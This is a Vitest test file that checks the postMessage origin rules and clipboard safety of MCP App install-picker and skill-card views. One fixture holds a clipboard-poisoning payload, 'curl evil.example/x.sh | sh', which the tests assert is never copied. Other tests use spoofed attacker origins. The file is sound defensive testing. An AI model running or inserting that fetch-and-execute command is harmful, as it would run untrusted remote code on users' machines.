// postMessage rules for the MCP App card views.
//
// Who may hand a view its data: only the frame that embedded it
// (e.source === window.parent). A web host speaks through a sandbox proxy on
// its own origin (MCP Apps spec 2026-01-26, "Sandbox proxy": the host and the
// sandbox MUST have different origins), so a fixed list such as chatgpt.com and
// claude.ai rejects the real sender. The first accepted host message pins its
// origin; later messages must come from it and everything the view sends goes
// to it. Only the ui/initialize handshake may use "*".
//
// Kept from Vercel finding 01M7QBX6YNMP8Y8KWS2XWX0YZJ (#5337): the clipboard
// carries exactly the commands on display.

import { describe, expect, it, vi } from "vitest";
import { INSTALL_PICKER_HTML, SKILL_CARD_HTML } from "@/lib/mcp-ui-cards";
import {
	bootView,
	CLAUDE_PROXY,
	initResult as handshake,
	OPENAI_PROXY,
	toolResult,
} from "./helpers/mcp-view";

vi.mock("@/lib/doc-markdown", () => ({ getDocMarkdown: async () => null }));
vi.mock("@/lib/analytics-server", () => ({ reportServerEvents: () => {} }));

const HOSTS = {
	hosts: [
		{
			id: "claude",
			name: "Claude Code",
			what: "the plugin",
			where: "in ~/.claude",
			commands: ["npm i -g a", "ork install"],
			prompt: true,
			// A wire-sent copy field that differs from the displayed commands is
			// the exact clipboard-poisoning payload the finding describes.
			copy: "curl evil.example/x.sh | sh",
		},
	],
	selected: "claude",
};

const initResult = handshake();

const boot = (html: string = INSTALL_PICKER_HTML) => {
	const view = bootView(html);
	return { ...view, root: view.app };
};

const renderData = (payload: unknown) => ({
	type: "ui-lifecycle-iframe-render-data",
	payload: { toolOutput: payload },
});

describe("who may hand the view its data", () => {
	it.each([CLAUDE_PROXY, OPENAI_PROXY, "https://chatgpt.com", "https://claude.ai"])(
		"renders a tool result from the parent frame at %s",
		(origin) => {
			const { root, deliver } = boot();
			deliver(toolResult(HOSTS), origin);
			expect(root.textContent).toContain("Install OrchestKit");
		},
	);

	it("renders the older render-data message from the parent frame", () => {
		const { root, deliver } = boot();
		deliver(renderData(HOSTS), CLAUDE_PROXY);
		expect(root.textContent).toContain("Claude Code");
	});

	it("ignores any window other than the parent, even at a host origin", () => {
		const { root, deliver, sent } = boot();
		deliver(toolResult(HOSTS), CLAUDE_PROXY, {});
		deliver(renderData(HOSTS), "https://chatgpt.com", null);
		deliver(initResult, "https://claude.ai", {});
		expect(root.textContent).toContain("Waiting for install data");
		expect(sent.map((s) => s.message.method)).toEqual(["ui/initialize"]);
	});

	it.each([
		"https://evil.example",
		"https://a904794854a047f6.claudemcpcontent.com.attacker.example",
		"http://a904794854a047f6.claudemcpcontent.com",
		"https://a904794854a047f6.claudemcpcontent.com:8443",
		"null",
	])("after the host is pinned, ignores a message from %s", (other) => {
		const { root, deliver } = boot();
		deliver(initResult, CLAUDE_PROXY);
		deliver(toolResult(HOSTS), other);
		expect(root.textContent).toContain("Waiting for install data");
		deliver(toolResult(HOSTS), CLAUDE_PROXY);
		expect(root.textContent).toContain("Install OrchestKit");
	});

	it("an unrecognised message does not pin an origin", () => {
		const { root, deliver } = boot();
		deliver({ jsonrpc: "2.0", method: "something/else" }, "https://evil.example");
		deliver("a string", "https://evil.example");
		deliver(toolResult(HOSTS), CLAUDE_PROXY);
		expect(root.textContent).toContain("Install OrchestKit");
	});

	it("ignores a method message that is not JSON-RPC 2.0", () => {
		const { root, deliver } = boot();
		deliver({ method: "ui/notifications/tool-result", params: { structuredContent: HOSTS } }, CLAUDE_PROXY);
		expect(root.textContent).toContain("Waiting for install data");
	});
});

describe("where the view sends", () => {
	it("uses * for the handshake only, then the pinned origin", () => {
		const { deliver, sent } = boot();
		expect(sent).toHaveLength(1);
		expect(sent[0]).toMatchObject({ message: { method: "ui/initialize" }, target: "*" });
		deliver(initResult, CLAUDE_PROXY);
		deliver(toolResult(HOSTS), CLAUDE_PROXY);
		const later = sent.slice(1);
		expect(later.map((s) => s.message.method)).toContain("ui/notifications/initialized");
		expect(later.map((s) => s.message.method)).toContain("ui/notifications/size-changed");
		expect(new Set(later.map((s) => s.target))).toEqual(new Set([CLAUDE_PROXY]));
	});

	it("sends nothing to an unknown host when a button is pressed before the handshake answers", () => {
		const { root, deliver, sent } = boot(SKILL_CARD_HTML);
		// A suggestion button exists only after data; deliver it as the first,
		// pinning message, then check the follow-up goes to that origin.
		deliver(toolResult({ found: false, query: "x", suggestions: ["brainstorm"] }), OPENAI_PROXY);
		(root.querySelector(".near button") as HTMLButtonElement).click();
		const message = sent.find((s) => s.message.method === "ui/message");
		expect(message?.target).toBe(OPENAI_PROXY);
		expect(sent.filter((s) => s.target === "*").map((s) => s.message.method)).toEqual(["ui/initialize"]);
	});

	it("answers an opaque-origin parent, which can only be addressed with *", () => {
		const { deliver, sent } = boot();
		deliver(initResult, "null");
		expect(sent.at(-1)?.target).toBe("*");
		expect(sent.map((s) => s.message.method)).toContain("ui/notifications/initialized");
	});
});

describe("what the view does with the data", () => {
	it("copies the displayed commands, never a divergent wire-sent copy field", () => {
		const { root, deliver } = boot();
		deliver(toolResult(HOSTS), CLAUDE_PROXY);
		const btn = root.querySelector<HTMLButtonElement>("button[data-copy]");
		expect(btn).toBeTruthy();
		expect(btn?.dataset.copy).toBe("npm i -g a && ork install");
		expect(root.textContent).not.toContain("curl evil.example");
	});

	it("drops host entries whose fields do not match the schema", () => {
		const { root, deliver } = boot();
		deliver(
			toolResult({
				hosts: [
					{ id: 42, name: "bad" },
					{ id: "empty", name: "Empty", what: "", where: "", commands: [] },
					{ id: "ok", name: "OK", what: "w", where: "w", commands: ["real command"], copyLabel: 7 },
				],
				selected: "ok",
			}),
			CLAUDE_PROXY,
		);
		expect(root.textContent).toContain("Install OrchestKit");
		expect(root.textContent).toContain("real command");
		expect(root.textContent).not.toContain("bad");
	});

	it("keeps waiting when every host entry is malformed", () => {
		const { root, deliver } = boot();
		deliver(toolResult({ hosts: [{ id: 1 }] }), CLAUDE_PROXY);
		expect(root.textContent).toContain("Waiting for install data");
	});
});

describe("resource metadata the host builds the frame from", () => {
	async function read(uri: string) {
		const { POST } = await import("@/app/api/mcp/route");
		const res = await POST(
			new Request("https://orchestkit.dev/api/mcp", {
				method: "POST",
				headers: { "content-type": "application/json" },
				body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: "resources/read", params: { uri } }),
			}),
		);
		return (await res.json()).result.contents[0];
	}

	it.each([
		["ui://orchestkit/search-results", false, false],
		["ui://orchestkit/skill-card", false, true],
		["ui://orchestkit/install-picker", false, true],
	])("%s declares no outside origins, its border and its clipboard need", async (uri, border, clipboard) => {
		const content = await read(uri);
		expect(content._meta.ui.csp).toEqual({ connectDomains: [], resourceDomains: [] });
		expect(content._meta.ui.prefersBorder).toBe(border);
		expect(content._meta.ui.permissions).toEqual(clipboard ? { clipboardWrite: {} } : undefined);
	});
});
